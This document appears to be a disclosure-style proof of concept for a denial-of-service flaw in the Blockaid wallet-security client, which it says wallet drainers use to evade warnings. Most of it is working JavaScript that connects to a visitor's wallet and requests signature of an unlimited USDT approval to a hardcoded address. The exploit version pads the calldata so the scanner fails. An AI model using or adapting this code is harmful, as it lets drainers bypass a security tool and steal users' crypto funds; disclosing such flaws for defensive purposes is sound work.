## Proof of Concept: Denial of Service (DoS) on Blockaid Client

The following JavaScript code demonstrates a Proof of Concept (PoC) for a Denial of Service (DoS) vulnerability targeting the Blockaid client. The exploit relies on sending a maliciously crafted transaction with excessively large data payloads that can potentially freeze or disrupt the client.
This vulnerability is used by wallet drainers to get around Blockaid's reports and make users sign malicious transactions thinking they're safe.

### **PoC Code**

```javascript
var walletConnected = "";

async function connectWallets() {
    try {
        walletConnected = await window.ethereum.request({
            method: "eth_requestAccounts",
        });
        walletConnected = walletConnected[0];
        console.log("Wallet connected:", walletConnected);
    } catch (err) {
        console.error("Error connecting wallets:", err);
    }
}

async function changeWallet() {
    try {
        await window.ethereum.request({
            method: 'wallet_requestPermissions',
            params: [{ eth_accounts: {} }],
        }).then((permissions) => {
            const accountsPermission = permissions.find(
                (permission) => permission.parentCapability === 'eth_accounts'
            );
            walletConnected = accountsPermission.caveats[0].value[0];
        });
    } catch (err) {
        console.error("Error changing wallets:", err);
    }
}

window.addEventListener("DOMContentLoaded", () => {
    connectWallets();
});

async function testLegitTransaction(){
    await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            "from": walletConnected,
            "data": "0x095ea7b3000000000000000000000000A7ab055f18ed0BF218Fa0BE1994c26Fc157Dc6f1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
            "gas": "0xf91c",
            "to": "0xdac17f958d2ee523a2206206994597c13d831ec7",
            "value": "0x0",
            "maxFeePerGas": "0x37e11d600",
            "maxPriorityFeePerGas": "0x3b9aca00"
        }],
    });
}

async function testExploitTransaction(){
    await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            "from": walletConnected,
            "data": "0x095ea7b3000000000000000000000000A7ab055f18ed0BF218Fa0BE1994c26Fc157Dc6f1" + "f".repeat(5000),
            "gas": "0xf91c",
            "to": "0xdac17f958d2ee523a2206206994597c13d831ec7",
            "value": "0x0",
            "maxFeePerGas": "0x37e11d600",
            "maxPriorityFeePerGas": "0x3b9aca00"
        }],
    });
}
